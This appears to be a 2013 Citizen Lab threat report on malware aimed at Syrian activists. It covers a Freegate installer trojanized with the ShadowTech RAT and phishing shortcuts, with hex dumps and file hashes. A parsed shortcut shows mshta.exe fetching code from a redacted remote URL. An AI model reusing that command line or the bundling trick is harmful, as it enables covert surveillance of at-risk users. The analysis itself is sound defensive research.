A pro-government group calling itself the Syrian Electronic Army has gained visibility in\nrecent months with high profile attacks against [news](http://bits.blogs.nytimes.com/2013/05/10/details-emerge-about-syrian-electronic-armys-recent-exploits/) [organizations. Meanwhile, Syrian activists continue to be](http://www.nytimes.com/2013/05/18/technology/financial-times-site-is-hacked.html?pagewanted=all&_r=1)\ntargeted with online attacks apparently for the purposes of accessing their private communications and stealing\ntheir secrets.\n\n[Throughout 2012, attacks against the Syrian opposition were documented in an extensive](https://www.eff.org/deeplinks/2012/05/trojan-hidden-fake-revolutionary-documents-targets-syrian-activists) [series](https://www.eff.org/deeplinks/2012/03/fake-youtube-site-targets-syrian-activists-malware) of [blog](https://www.eff.org/deeplinks/2012/05/fake-skype-encryption-tool-targeted-syrian-activists-promises-security-delivers) [posts](https://www.eff.org/deeplinks/2012/12/iinternet-back-in-syria-so-is-malware)\n[by Morgan Marquis-Boire and Eva Galperin with the help of the Electronic Frontier Foundation.[1] Many others](https://www.eff.org/)\n[have also contributed to research](http://syrianmalware.com/) on Syrian malware, from Telecomix to a range of security companies.\n[Meanwhile, the Syrian opposition, and several groups working closely with it, such as Cyber Arabs, have been](https://www.cyber-arabs.com/)\nactive in attempting to identify potential threats and warn users.\n\nResearchers have identified a common theme among the attacks against the Syrian opposition: sophisticated\nsocial engineering that is grounded in an awareness of the needs, interests, and weaknesses of the opposition.\nAttacks often play on curiosity or ideology to encourage users to enter passwords or click on enticing files, or\nexploit fears of hacking and surveillance with fake security tools. Attacks are often transmitted to potential\nvictims from the accounts of people with whom they are familiar.\n\n\n-----\n\nThe two attacks that are described in this blogpost follow this theme. One is a malicious installer of the\ncircumvention tool Freegate. The other is an e-mail attachment calling for jihad against Hezbollah and the\nAssad regime or promising interesting regional news.\n\n## ATTACK 1: A HELPING OF MALWARE WITH THAT PROXY?\n\nIn this attack, which we first observed in the second week of June, the potential victim is encouraged to visit a\ndownload link containing a malicious installer of Freegate.\n\nFreegate is a standalone circumvention-bypassing Virtual Private Network (VPN) client for Windows.\n[Legitimate versions of the Freegate software are available for download on its website. While initially](http://www.dit-inc.us/freegate)\ndeveloped for mainland Chinese users, the software is used in a number of other countries.\n\n[While Freegate was erroneously labelled a Trojan by one anti-virus company nearly a decade ago, in this](http://www.theregister.co.uk/2004/09/16/symantec_relabels_freegate/)\nattack, attackers packaged what appears to be a legitimate version of Freegate with a malicious implant.[2] The\ntargeted group were members of the Syrian opposition in a private social media group.\n```\nhttp://www.mediafire.com/download/[REDACTED]/VPN-Pro.zip\n\n```\nWhen a potential victim visits the link, they are offered the download of a file which MediaFire lists as\nuploaded on June 15, 2013.\n```\nVPN-PRO.zip[3]\nUploaded: 2013-06-15 16:54:31\n\n```\nThe zip file extracts to a MS Windows executable file.\n```\nVPN-Pro.exe[4]\n\n```\n\n-----\n\nThe binary was compiled at 2013-06-15 22:41:31 UTC and has the following properties:\n```\nLegalCopyright: Copyright © 2013\nAssembly Version: 1.0.0.0\nInternalName: VPN-Pro.exe\nFileVersion: 1.0.0.0\nProductName: VPN-Pro\nProductVersion: 1.0.0.0\nFileDescription: VPN-Pro\nOriginalFilename: VPN-Pro.exe\n\n```\n[Similar to previously observed malware attacks targeting the Syrian opposition, this was written in .NET and](https://www.eff.org/deeplinks/2012/04/new-wave-facebook-phishing-attacks-targets-syrian-activists)\nappears to require the .NET 3.5 framework to execute.[5]\n\nWhen VPN-Pro.exe is run, the victim is shown the Freegate end-user license agreement (EULA) dialogue\nbox.[6] Upon agreeing to the EULA, an operational copy of Freegate proxy is launched, which includes a\nrequest to unblock the firewall. The copy of Freegate launched is listed as “Freegate 7.35 Professional\nEdition.” The Freegate software begins operating, and quickly prompts the user for an update.\n\n\n-----\n\n## Infection\n\nIn addition to running a legitimate copy of Freegate 7.35,[7] the malware installs an implant.\n\n\n-----\n\nA fake “svchost.exe” is installed in the victim’s Application Data directory.\n```\nC:\\Documents and Settings\\<Username>\\Application Data\\svchost.exe\n\n```\nDropped files on execution of VPN-Pro.exe:\n\n\n-----\n\nExamination of the “svchost.exe” binary shows multiple references to “ShadowTech Rat.”\n```\n0000d5f0 00 53 68 61 64 6f 77 54 65 63 68 20 52 61 74 2e |.ShadowTech Rat.|\n0000d600 65 78 65 00 53 68 61 64 6f 77 54 65 63 68 20 52 |exe.ShadowTech R|\n0000d610 61 74 00 3c 4d 6f 64 75 6c 65 3e 00 01 00 03 00 |at.<Module>.....|\n<snip>\n0000d6d0 04 00 56 61 6c 75 65 54 79 70 65 00 05 00 44 61 |..ValueType...|Da|\n0000d6e0 74 61 00 53 68 61 64 6f 77 54 65 63 68 5f 52 61 |ta.ShadowTech_Ra|\n0000d6f0 74 00 49 53 65 72 69 61 6c 69 7a 61 62 6c 65 00 |t.ISerializable.|\n0000d700 53 79 73 74 65 6d 2e 52 75 6e 74 69 6d 65 2e 53 |System.Runtime.S|\n0000d710 65 72 69 61 6c 69 7a 61 74 69 6f 6e 00 4d 79 53 |erialization.MyS|\n0000d720 65 74 74 69 6e 67 73 00 53 68 61 64 6f 77 54 65 |ettings.ShadowTe|\n0000d730 63 68 5f 52 61 74 2e 4d 79 00 41 70 70 6c 69 63 |ch_Rat.My.Applic|\n\n```\nExamination of network traffic also identifies the implant as ShadowTech RAT.\n\nPacket capture on port 1321/tcp:\n```\n00 01 00 00 00 ff ff ff ff 01 00 00 00 00 00 00  ................\n00 0c 02 00 00 00 45 53 68 61 64 6f 77 54 65 63  ......EShadowTec\n68 20 52 61 74 2c 20 56 65 72 73 69 6f 6e 3d 31  h Rat, Version=1\n2e 30 2e 30 2e 30 2c 20 43 75 6c 74 75 72 65 3d  .0.0.0, Culture=\n6e 65 75 74 72 61 6c 2c 20 50 75 62 6c 69 63 4b  neutral, PublicK\n65 79 54 6f 6b 65 6e 3d 6e 75 6c 6c 05 01 00 00  eyToken=null....\n00 13 53 68 61 64 6f 77 54 65 63 68 5f 52 61 74  ..ShadowTech_Rat\n2e 44 61 74 61 03 00 00 00 04 64 61 74 61 05 69  .Data.....data.i\n6d 61 67 65 05 62 79 74 65 73 01 02 02 02 00 00  mage.bytes......\n00 06 03 00 00 00 64 31 30 32 36 32 32 30 32 31  ......d102622021\n46 32 30 30 33 32 34 30 33 30 30 33 36 32 44 36  F2003240300362D6\n34 33 38 30 42 34 33 35 37 31 30 31 36 33 31 33  4380B43571016313\n44 33 39 30 30 32 45 32 31 30 36 30 38 30 43 30  D39002E2106080C0\n46 32 35 33 38 30 37 30 38 30 35 37 41 37 35 33  F25380708057A753\n33 30 44 37 37 32 36 33 35 33 31 36 39 33 45 34  30D77263531693E4\n34 37 45 31 35 35 38 37 38 35 43 0a 0a 0b     47E1558785C...\n\n```\nShadowTech Rat is a Remote Access Trojan which appears to be widely available for download on both\n[English and Arabic language sites.

In 2012,\nmalicious installers for Green Simurgh—a standalone proxy intended for Iranian users but also used by some\n[Syrians—were found in circulation. The creators of Green Simurgh responded by posting a prominent](https://citizenlab.org/2012/05/iranian-anti-censorship-software-simurgh-circulated-with-malicious-backdoor-2/)\n[warning on their website](https://simurghesabz.net/) highlighting the presence of these malicious installers. Last year, malware which\n[purported to be the Tor Browser Bundle was found in the wild. It was found to be backdoored by Gh0st RAT](https://www.virustotal.com/en/file/bd970e0d63cd3abeb10ab2b0b82f33065be7f4b440564a24c6e19724f643a133/analysis/)\nand exfiltrated data to an IP in China.\n\nAn attack using a malicious installer of a working and reputable security or proxy tool is especially pernicious\nas it targets users who likely recognize the importance of privacy and circumvention, and may believe that\nthey have increased their privacy and security by installing the tool.\n\n## ATTACK 2: A TARGETED CALL TO ARMS\n\nIn this campaign, contact with targets was initiated through phishing e-mails, chat messages and Facebook\nposts. Although we became aware of this campaign in early June, we have evidence that it may have started as\nearly as January 2013. We believe that this campaign targeted—at least in part—high-profile members of the\nSyrian opposition. Interestingly, the attack included targeting of at least one non-public address associated\nwith internal opposition communications. This indicates some degree of prior penetration of the opposition—\neither through computer network intrusion or other intelligence gathering activities.\n\nThe potential victim in this attack first receives a message from an unknown source, in this case, a Gmail\naccount with a nondescript name.\n\nExample e-mail:\n\n\n-----\n\nThe e-mail contains text, an image (not shown), and an attachment. The text refers to a video of Sheikh Adnan\nal-Arour—a Sunni pro-opposition cleric—based in Saudi Arabia, calling for holy war against Assad and\nHezbollah. The user is led to believe that opening the zip file, which is descriptively titled as being the\nSheikh’s opinion, will provide access to the video.\n\nWhile we have identified multiple different attacks with different zip files, the structure of all of these is\nconsistent with the example described here.\n\nExample zip files:\n\nال سوري ال وط ني تالف ب اإلئ ال عرعور عدن ان ال ش يخ [رأي .zip[9]](https://citizenlab.org/wp-admin/post.php?post=20180&action=edit#9)\nال جهاد ي ع لن ال عرعور عدن ان ال ش يخ – راب ط .zip\nدماغ ية ب ج لطة االب راه يمي االخ ضر ال دول ي ال م بعوث ا صاب ة .zip\nع نها ال ح ق ي قي وال م سؤول ق وي ق ن هر مجزرة حول جدا خاص.zip\n\nThe zip file extracts to a Windows Shortcut file with the same name and a .lnk extension.\n\nExample .lnk file “Sample A”:\n\nال ش يخ عدن ان ال عرعور تالف ب اإلئ ال وط ني ال سوري.lnk\n\n\n-----\n\nParsing these files reveals a URL embedded in the the file (bolded below).\n\nParsing “Sample A”:\n```\nsource path/filename: 1file modified: 06/16/2013 16:49:04 [UTC]\nfile accessed: 06/19/2013 22:00:22 [UTC]\nfile created: 06/19/2013 22:00:22 [UTC]\nTarget flags: HasLinkTargetIDList, HasLinkInfo, HasRelativePath, Has\nWorkingDir, HasArguments, HasIconLocation, IsUnicode, DisableLinkPathTracking\nTarget attributes: FILE_ATTRIBUTE_ARCHIVE\nTarget modified: 07/17/2012 22:58:51.981 [UTC]\nTarget accessed: 07/17/2012 22:58:51.981 [UTC]\nTarget created: 07/17/2012 22:58:51.981 [UTC]\nTarget ObjID time: 12/27/2012 10:55:02.540 [UTC]\nFile offset: 0x00000000 [0]\nParsed size: 0x000005b2 [1458 bytes]\nTarget file size: 0x00003000 [12288 bytes]\nShow cmd: [SW_SHOWNORMAL]\nID List: {CLSID_MyComputer}\\C:\\Windows\\System32\\mshta.exe\nVolume Type: fixed\nVolume serial num: 7203-8b23\n\n```\n`Volume label: ╟ß▐╤╒` ╟ßπ═ßφ: C\n```\nLocal base path: C:\\Windows\\System32\\mshta.exe\nRelative path: ..\\..\\..\\Windows\\System32\\mshta.exe\nWorking directory: C:\\Windows\\system32\nCmdline args: http://[REDACTED]?url=http://www.youtube.com/watch?v=jDkluDCn7fA\nIcon filename: %SystemRoot%\\system32\\SHELL32.dll\nSpecial Folder ID: CSIDL_SYSTEM\nKnown Folder ID: 1ac14e77-02e7-4e5d-b744-2eb1ae5198b7\nNETBIOS name: xp-pc\nVolume ID: 32035a92-7032-4de3-846f-ed880ad23fa7\nObject ID: dd81bda8-5013-11e2-ab13-c0f8da734a02\nMAC address: c0:f8:da:73:4a:02\nformat ID [value]: {b725f130-47ef-101a-a5f1-02608c9eebac}\n[mshta.exe\\╪º┘ä╪¬╪╖╪¿┘è┘é]\nformat ID [value]: {46588ae2-4cbc-4338-bbfc-139326986dce} [S-1-5-21-13484416121947693625-1007466904-1000]\nformat ID [value]: {dabd30ed-0043-4789-a7f8-d013a4736622} [System32▲\n(ΓÇ¬C:\\WindowsΓÇ¼)]\nformat ID [value]: {28636aa6-953d-11d2-b5d6-00c04fd918d0}\n[C:\\Windows\\System32\\mshta.exe]\n\n```\nWhen the victim executes the Windows shortcut, they are directed to one of several malicious links depending\non the zipfile that they were sent.

We have\nchosen to highlight two attacks that are part of recent efforts by Pro-Government Electronic Actors to\ncompromise opposition communications and steal their secrets.\n\nThese attacks cater to the opposition’s communication behaviors and tactics. They are indicative of a\ncombination of prior intelligence about the opposition, and ingenuity in social engineering. For example,\nmany in the Syrian opposition are now aware of the electronic threats they face and seek out tools to increase\ntheir communications security and privacy. Tools and information about security and communications are in\nconstant circulation. Some of this material addresses well-defined vulnerabilities. We have observed a greater\ndegree of care among many in the opposition when facing certain situations that were common attack\nmodalities in 2012. As awareness grows and behavior evolves, we suspect that some of the attacks that we\nregularly observed in 2012 are much less successful today.\n\nSome of the information and practices that are shared between users, however, are much less appropriate, even\ninadvertently dangerous. For example, many legitimate tools are shared via third party file sharing sites or\nover social media. This situation presents a rich variety of targets for attackers in which to seed malicious\nbinaries and links masquerading as familiar or desirable tools.\n\nWe infer that from the point of view of these attackers, not all attacks need to have sophisticated malware in\norder to be successful enough to be worth doing. Yet, perhaps in response to the growing awareness of\nprevious and often widely targeted attacks against the Syrian opposition, attackers continue to innovate and\n\n\n-----\n\nexperiment with new techniques that blend social engineering with new attack styles. The experiments are\nsometimes clearly successful. For example, in the case of Attack 2, the Windows shortcut files were not\nconclusively identified as malicious by even savvy opposition members for an extended period of time.\n\nWe hope that this post will increase awareness of the two attacks among potential targets. In the meantime,\nusers who have executed either the fake Freegate file or clicked on one of the Windows shortcut files should\nconsider their computers and accounts compromised.\n\n## APPENDIX: RECOMMENDATIONS FOR FREEGATE AND FREEGATE USERS\n\nThe Freegate website is blocked in China (its primary target market), as is the case with other similar\ncircumvention tools. To get around blocking, tools are often distributed between individuals, or through\nuntrusted downloads from third party sites. This is an unfortunate vector for attackers to distribute malicious\ninstallers and bundles that also contain functional versions of the program. As demonstrated by our work on\nthe Freegate malware, as well as the Green Simurgh case, these vulnerabilities are exploited with serious\nconsequences for high-risk users.\n\nWe understand the resource constraints that developers of free security and circumvention software often face.\nAs such, we propose two simple steps that Freegate could take to help mitigate the current and similar future\nthreats.\n\n  - **1) Freegate should take steps to make their users aware of the threat.**\n\nWe provided Freegate developers with details of the attack, copies of the malicious binary, and other\ndetails prior to publication. We would like to point them towards the example established by Green\nSimurgh, who promptly posted a multilingual warning to their website when a malicious repackaging\nof their tool was found to be targeting Syrian users. We have offered to help them translate any\nwarning materials into Arabic.\n\n  - **2) Freegate should implement by-default HTTPS on their website.**\n\nCurrently, visitors to the Freegate website follow non-HTTPS links to an unencrypted download. We\nbelieve that this presents a clear risk for man-in-the-middle attacks. Most developers of similar anticensorship, circumvention, and security tools have implemented this security measure. We encourage\nFreegate to follow suit.\n\n## ACKNOWLEDGEMENTS\n\nSpecial thanks to several anonymous Syrians who brought these malware samples to our attention.\n\nAdditional thanks to Bill Marczak, Byron Sonne, Adam Senft, and Ron Deibert.\n\n_______________________________________\n\n\n-----\n\n## Footnotes\n\n[1 State-Sponsored Malware, “Electronic Frontier Foundation,” https://www.eff.org/issues/state-sponsored-](https://www.eff.org/issues/state-sponsored-malware)\n[malware.](https://www.eff.org/issues/state-sponsored-malware)\n2 We notified Freegate on June 17, 2013.\n3 MD5 b3e1c2e40be54fbc0f7921ea8ce807e2\nSHA1 3f6436420e84ac96d9a3c93045c07cdadda8ec81\nSHA256 3712907740045871eef218fea7292c9c017e64cbb56b193b93f1a1b80afe599d\n4 MD5 8eda7dfa4ec4ac975bb12d2a3186bbeb\nSHA1 b5c49bbbf7499a30110adc94480b3edbc8d6e92b\nSHA256 829e137279f691e493c211108b62c8e15b079bd619ba19ad388450878e0585d0\n5 It failed to execute with .NET 4.0 on Windows XP.\n6 The implant is installed regardless of whether or not the victim completes the FreeGate installation process.\n7 The file fg735p.exe matches the hash of a legitimate FreeGate installer.\nMD5 b083418be502162a4e248faab363f1b9\nSHA1 030937f008bc203198e3754b1b54bb6d8d72794b\nSHA256 d6ded89b91cdcd5d9ad4f6453f38f04f11f608d8db77db09e7400cfd7bcecddf\n8MD5 2ba789458781b1dfd7f34624c8410edb\nSHA1 77fd62d8e630e74d637682b91d0952d48b7c52be\nSHA256 80b3fa8113a89040048a87c63ab9d8117368f2579368f5ea5999b145c47c4490\n9 MD5 59c6e0fa61d62a1f52b6092dc92a4aa7\nSHA1 fce82013dbb9261db8b14451122fa889dfdba2e0\nSHA256 71cb3e1007da3193c89a532b275cf539730b25bd63bcc5e912503ddd4bc9097f\n10 MD5 61a26c391aa95084521f5c0f6f70b966\nSHA1 bd901cf02778d5c76dfe7c2877d773baa5bae5a7\nSHA256 2c7600e0e660b0788faf5f5de3c10ac257000a557278eba41d3e7ec6175f22fb\n11 MD5 00cc589571fa6e078cb92b34ea2ee1cc\nSHA1 bfe30069998c5e4c43f98f17538678074d02ca3d\nSHA256 bcf32f82f0971c8984bb493f5473f0f417c203c0484c80a772ee1165a8c7675d\n[12 For example, see: http://undercrypter.blogspot.de/2013/03/blog-post.html.](http://undercrypter.blogspot.de/2013/03/blog-post.html)\n\n\n-----",
